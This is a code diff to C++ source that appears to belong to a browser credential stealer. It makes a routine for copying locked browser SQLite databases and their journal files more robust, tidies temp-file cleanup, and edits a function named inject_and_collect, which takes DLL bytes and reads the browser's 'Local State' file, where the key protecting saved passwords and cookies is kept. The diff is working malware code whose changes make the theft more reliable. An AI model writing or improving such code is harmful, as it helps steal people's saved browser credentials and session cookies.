@@ -228,9 +228,9 @@ bool copy_file_locked(const fs::path& source, const fs::path& dest) {
     if (!copy_single_file(source, dest)) return false;
     std::wstring src_w = source.wstring();
     std::wstring dst_w = dest.wstring();
-    copy_single_file(src_w + L"-wal", dst_w + L"-wal");
-    copy_single_file(src_w + L"-journal", dst_w + L"-journal");
-    copy_single_file(src_w + L"-shm", dst_w + L"-shm");
+    if (fs::exists(src_w + L"-wal")) copy_single_file(src_w + L"-wal", dst_w + L"-wal");
+    if (fs::exists(src_w + L"-journal")) copy_single_file(src_w + L"-journal", dst_w + L"-journal");
+    if (fs::exists(src_w + L"-shm")) copy_single_file(src_w + L"-shm", dst_w + L"-shm");
     return true;
 }
 
@@ -240,10 +240,11 @@ int open_db_readonly(const std::string& path, sqlite3** db) {
 }
 
 void cleanup_db_temp(const fs::path& path) {
-    fs::remove(path);
-    fs::remove(path.string() + "-wal");
-    fs::remove(path.string() + "-journal");
-    fs::remove(path.string() + "-shm");
+    std::error_code ec;
+    fs::remove(path, ec);
+    fs::remove(path.string() + "-wal", ec);
+    fs::remove(path.string() + "-journal", ec);
+    fs::remove(path.string() + "-shm", ec);
 }
 
 struct BrowserConfig {
@@ -451,10 +452,13 @@ void inject_and_collect(const std::vector<unsigned char>& dll_bytes, const Brows
         std::string ls_str;
         fs::path ls_path = data_path / "Local State";
         fs::path ls_tmp = temp_dir / "ls.tmp";
+        std::error_code ec;
         if (copy_file_locked(ls_path, ls_tmp)) {
-            std::ifstream ls_file(ls_tmp);
-            if (ls_file) ls_str.assign((std::istreambuf_iterator<char>(ls_file)), std::istreambuf_iterator<char>());
-            fs::remove(ls_tmp);
+            {
+                std::ifstream ls_file(ls_tmp);
+                if (ls_file) ls_str.assign((std::istreambuf_iterator<char>(ls_file)), std::istreambuf_iterator<char>());
+            }
+            fs::remove(ls_tmp, ec);
         } else {
             std::ifstream ls_file(ls_path);
             if (ls_file) ls_str.assign((std::istreambuf_iterator<char>(ls_file)), std::istreambuf_iterator<char>());
